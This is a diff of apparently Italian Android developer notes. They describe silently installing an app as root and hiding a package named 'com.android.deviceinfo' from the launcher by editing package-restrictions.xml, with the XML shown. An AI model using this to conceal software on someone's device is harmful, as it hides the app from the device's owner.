@@ -106,3 +106,10 @@ tramite "pm install -r" da root si puo' installare un'applicazione in maniera si
 Se sparisce local.properties:
 android update project -p .
 
+- Per far sparire l'icona quando si ha la root si puo' intervenire qui: /data/system/users/0/package-restrictions.xml
+
+<pkg name="com.android.deviceinfo">
+<disabled-components>
+<item name="com.android.deviceinfo.gui.AGUI" />
+</disabled-components>
+</pkg>
